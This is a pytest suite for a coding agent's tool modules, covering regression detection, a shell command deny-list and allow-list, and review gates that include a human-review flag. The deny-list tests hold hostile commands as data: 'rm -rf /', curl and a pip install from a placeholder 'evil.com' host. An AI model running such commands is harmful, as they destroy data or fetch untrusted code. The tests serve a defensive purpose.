"""
Unit tests for the three new tool modules:
  - test_runner_tool: regression detection, failure truncation, no-report fallback
  - shell_tool:       deny-list, allow-list, output truncation
  - meta_tools:       submit_plan extension guard, submit_for_review gates,
                      request_human_review Redis flag
"""
from __future__ import annotations

import json
import os
import pytest
from unittest.mock import AsyncMock, MagicMock, patch


# ── env bootstrap ────────────────────────────────────────────────────────────
@pytest.fixture(autouse=True)
def _env(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "dummy")
    monkeypatch.setenv("GITHUB_APP_ID", "1")
    monkeypatch.setenv("GITHUB_APP_PRIVATE_KEY_PATH", ".")
    monkeypatch.setenv("GITHUB_WEBHOOK_SECRET", "dummy")
    monkeypatch.setenv("DATABASE_URL", "postgresql://dummy")
    monkeypatch.setenv("REDIS_URL", "redis://localhost")
    monkeypatch.setenv("SANDBOX_IMAGE", "autoforge-sandbox:latest")


# ─────────────────────────────────────────────────────────────────────────────
# test_runner_tool
# ─────────────────────────────────────────────────────────────────────────────

class TestRunTests:
    def _make_report(self, tests):
        passed = sum(1 for t in tests if t["outcome"] == "passed")
        failed = sum(1 for t in tests if t["outcome"] == "failed")
        return json.dumps({
            "summary": {"passed": passed, "failed": failed, "error": 0},
            "duration": 1.23,
            "tests": tests,
        })

    @pytest.mark.asyncio
    async def test_all_passed_no_regression(self):
        from src.agent.tools.test_runner_tool import run_tests

        report = self._make_report([
            {"nodeid": "tests/test_foo.py::test_a", "outcome": "passed"},
        ])
        exec_r = MagicMock(exit_code=0, stdout="", stderr="", timed_out=False)

        with patch("src.agent.tools.test_runner_tool.SandboxManager") as Mgr:
            inst = Mgr.return_value
            inst.exec_in_sandbox = AsyncMock(return_value=exec_r)
            inst.read_file = MagicMock(return_value=report)

            result = await run_tests(container_id="c", task_id="t",
                                     baseline_test_ids=["tests/test_foo.py::test_a"])

        assert "1 passed" in result
        assert "REGRESSION" not in result

    @pytest.mark.asyncio
    async def test_regression_detected(self):
        from src.agent.tools.test_runner_tool import run_tests

        report = self._make_report([
            {"nodeid": "tests/test_foo.py::test_a", "outcome": "failed",
             "call": {"longrepr": "AssertionError: 1 != 2\nTraceback ..."}},
        ])
        exec_r = MagicMock(exit_code=1, stdout="", stderr="", timed_out=False)

        with patch("src.agent.tools.test_runner_tool.SandboxManager") as Mgr:
            inst = Mgr.return_value
            inst.exec_in_sandbox = AsyncMock(return_value=exec_r)
            inst.read_file = MagicMock(return_value=report)

            result = await run_tests(
                container_id="c", task_id="t",
                baseline_test_ids=["tests/test_foo.py::test_a"],
            )

        assert "REGRESSION" in result
        assert "test_a" in result

    @pytest.mark.asyncio
    async def test_no_report_fallback(self):
        from src.agent.tools.test_runner_tool import run_tests

        exec_r = MagicMock(exit_code=1, stdout="collection error", stderr="", timed_out=False)

        with patch("src.agent.tools.test_runner_tool.SandboxManager") as Mgr:
            inst = Mgr.return_value
            inst.exec_in_sandbox = AsyncMock(return_value=exec_r)
            inst.read_file = MagicMock(side_effect=FileNotFoundError("no report"))

            result = await run_tests(container_id="c", task_id="t")

        assert "errors" in result or "error" in result

    @pytest.mark.asyncio
    async def test_caps_at_5_failures(self):
        from src.agent.tools.test_runner_tool import run_tests

        tests = [
            {"nodeid": f"tests/test.py::test_{i}", "outcome": "failed",
             "call": {"longrepr": f"Error {i}"}}
            for i in range(8)
        ]
        report = self._make_report(tests)
        exec_r = MagicMock(exit_code=1, stdout="", stderr="", timed_out=False)

        with patch("src.agent.tools.test_runner_tool.SandboxManager") as Mgr:
            inst = Mgr.return_value
            inst.exec_in_sandbox = AsyncMock(return_value=exec_r)
            inst.read_file = MagicMock(return_value=report)

            result = await run_tests(container_id="c", task_id="t")

        # At most 5 "✗" markers
        assert result.count("✗") <= 5


# ─────────────────────────────────────────────────────────────────────────────
# shell_tool
# ─────────────────────────────────────────────────────────────────────────────

class TestRunCommand:
    @pytest.mark.asyncio
    async def test_denied_rm(self):
        from src.agent.tools.shell_tool import run_command
        result = json.loads(await run_command("c", "t", "rm -rf /"))
        assert result["exit_code"] == 1
        assert "not permitted" in result["output"]

    @pytest.mark.asyncio
    async def test_denied_git_push(self):
        from src.agent.tools.shell_tool import run_command
        result = json.loads(await run_command("c", "t", "git push origin main"))
        assert result["exit_code"] == 1

    @pytest.mark.asyncio
    async def test_denied_curl(self):
        from src.agent.tools.shell_tool import run_command
        result = json.loads(await run_command("c", "t", "curl http://evil.com"))
        assert result["exit_code"] == 1

    @pytest.mark.asyncio
    async def test_not_in_allowlist(self):
        from src.agent.tools.shell_tool import run_command
        result = json.loads(await run_command("c", "t", "make build"))
        assert result["exit_code"] == 1
        assert "Allowed" in result["output"]

    @pytest.mark.asyncio
    async def test_allowed_ruff_check(self):
        from src.agent.tools.shell_tool import run_command

        exec_r = MagicMock(exit_code=0, stdout="All good.", stderr="", timed_out=False)
        with patch("src.agent.tools.shell_tool.SandboxManager") as Mgr:
            Mgr.return_value.exec_in_sandbox = AsyncMock(return_value=exec_r)
            result = json.loads(await run_command("c", "t", "ruff check src/"))

        assert result["exit_code"] == 0
        assert "All good." in result["output"]

    @pytest.mark.asyncio
    async def test_output_truncated(self):
        from src.agent.tools.shell_tool import run_command, _OUTPUT_MAX_CHARS

        big = "x" * (_OUTPUT_MAX_CHARS + 500)
        exec_r = MagicMock(exit_code=0, stdout=big, stderr="", timed_out=False)
        with patch("src.agent.tools.shell_tool.SandboxManager") as Mgr:
            Mgr.return_value.exec_in_sandbox = AsyncMock(return_value=exec_r)
            result = json.loads(await run_command("c", "t", "cat somefile.txt"))

        assert result["truncated"] is True
        assert "[...truncated]" in result["output"]

    @pytest.mark.asyncio
    async def test_pip_install_index_url_denied(self):
        from src.agent.tools.shell_tool import run_command
        result = json.loads(
            await run_command("c", "t", "pip install --index-url http://evil.com pkg")
        )
        assert result["exit_code"] == 1


# ─────────────────────────────────────────────────────────────────────────────
# meta_tools
# ─────────────────────────────────────────────────────────────────────────────

class TestSubmitPlan:
    @pytest.mark.asyncio
    async def test_invalid_extension_rejected(self):
        from src.agent.tools.meta_tools import submit_plan

        with patch("src.agent.tools.meta_tools._make_redis") as mr:
            mr.return_value.setex = AsyncMock()
            mr.return_value.aclose = AsyncMock()
            result = await submit_plan(
                container_id="c", task_id="t",
                approach="do something",
                files_to_change=["src/evil.sh"],
            )
        assert "rejected" in result.lower()

    @pytest.mark.asyncio
    async def test_valid_plan_accepted(self):
        from src.agent.tools.meta_tools import submit_plan

        with patch("src.agent.tools.meta_tools._make_redis") as mr:
            mr.return_value.setex = AsyncMock()
            mr.return_value.aclose = AsyncMock()
            result = await submit_plan(
                container_id="c", task_id="t",
                approach="fix the bug",
                files_to_change=["src/foo.py"],
                tests_to_write=["tests/test_foo.py"],
                risks=["edge case"],
            )
        assert "accepted" in result


class TestSubmitForReview:
    @pytest.mark.asyncio
    async def test_all_gates_pass(self):
        from src.agent.tools.meta_tools import submit_for_review
        result = json.loads(await submit_for_review(
            container_id="c", task_id="t",
            summary="fixed it", tests_passed=True, regressions=False, confidence=0.9,
        ))
        assert result["proceed"] is True

    @pytest.mark.asyncio
    async def test_tests_not_passed_blocked(self):
        from src.agent.tools.meta_tools import submit_for_review
        result = json.loads(await submit_for_review(
            container_id="c", task_id="t",
            summary="done?", tests_passed=False, regressions=False, confidence=0.8,
        ))
        assert result["proceed"] is False
        assert "tests_passed" in result["reason"]

    @pytest.mark.asyncio
    async def test_regression_blocked(self):
        from src.agent.tools.meta_tools import submit_for_review
        result = json.loads(await submit_for_review(
            container_id="c", task_id="t",
            summary="done", tests_passed=True, regressions=True, confidence=0.8,
        ))
        assert result["proceed"] is False
        assert "regression" in result["reason"]

    @pytest.mark.asyncio
    async def test_low_confidence_blocked(self):
        from src.agent.tools.meta_tools import submit_for_review
        result = json.loads(await submit_for_review(
            container_id="c", task_id="t",
            summary="done", tests_passed=True, regressions=False, confidence=0.5,
        ))
        assert result["proceed"] is False
        assert "confidence" in result["reason"]

    @pytest.mark.asyncio
    async def test_multiple_failures_all_reported(self):
        from src.agent.tools.meta_tools import submit_for_review
        result = json.loads(await submit_for_review(
            container_id="c", task_id="t",
            summary="done", tests_passed=False, regressions=True, confidence=0.3,
        ))
        assert result["proceed"] is False
        # All three reasons should appear
        assert "tests_passed" in result["reason"]
        assert "regression" in result["reason"]
        assert "confidence" in result["reason"]


class TestRequestHumanReview:
    @pytest.mark.asyncio
    async def test_sets_redis_flag(self):
        from src.agent.tools.meta_tools import request_human_review

        with patch("src.agent.tools.meta_tools._make_redis") as mr:
            inst = MagicMock()
            inst.setex = AsyncMock()
            inst.aclose = AsyncMock()
            mr.return_value = inst

            result = await request_human_review(
                container_id="c", task_id="task-99", reason="too risky"
            )

        assert "human review requested" in result
        inst.setex.assert_called_once()
        key_used = inst.setex.call_args[0][0]
        assert "task-99" in key_used
